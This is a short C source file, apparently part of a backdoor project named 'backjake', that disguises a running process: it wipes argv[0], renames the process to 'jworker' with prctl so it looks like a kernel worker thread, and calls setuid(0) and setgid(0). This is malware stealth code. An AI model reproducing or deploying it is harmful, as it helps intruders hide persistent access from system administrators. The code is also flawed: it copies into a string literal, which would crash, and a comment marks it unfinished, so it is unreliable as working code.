#include "backjake.h"

void disguise(char ** argv)
{
	setDisguise(getDisguise(), argv[0]);
}

char* getDisguise()
{
	char* cloak = "jworker";
	// not yet implemented!!
	strcpy(cloak, "jworker");
	return cloak;
}

void setDisguise(char * cloak, char * argv)
{
	memset(argv, 0, strlen(argv));
	strcpy(argv, cloak);
	prctl(PR_SET_NAME, cloak, 0, 0);

	setuid(0);
	setgid(0);
}